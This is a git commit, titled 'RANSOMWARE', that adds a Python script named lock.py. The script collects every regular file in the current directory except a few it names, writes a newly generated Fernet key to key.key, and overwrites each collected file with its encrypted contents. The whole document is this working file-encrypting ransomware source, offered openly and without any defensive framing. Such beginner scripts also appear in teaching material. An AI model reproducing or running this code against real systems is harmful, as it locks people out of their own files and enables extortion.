7ff680698ee08170643cc3ac9b8ef390df7c267f
NONE <94441576+bhoxzmk1@users.noreply.github.com>
2023-07-12 23:44:06 +0800

    RANSOMWARE

---
+++ lock.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python3
+
+import os
+from cryptography.fernet import Fernet
+
+#let's find some files
+
+files = []
+
+for file in os.listdir():
+	if file == "py.py" or file == "key.key" or file == "unlock.py":
+		continue
+	if os.path.isfile(file):
+		files.append(file)
+
+print(files)
+
+
+key = Fernet.generate_key()
+
+with open("key.key", "wb") as thekey:
+	thekey.write(key)
+
+
+for file in files: 
+	with open(file, "rb") as thefile:
+		contents = thefile.read()
+	contents_encrypted = Fernet(key).encrypt(contents)
+	with open(file, "wb") as thefile:
+		thefile.write(contents_encrypted)
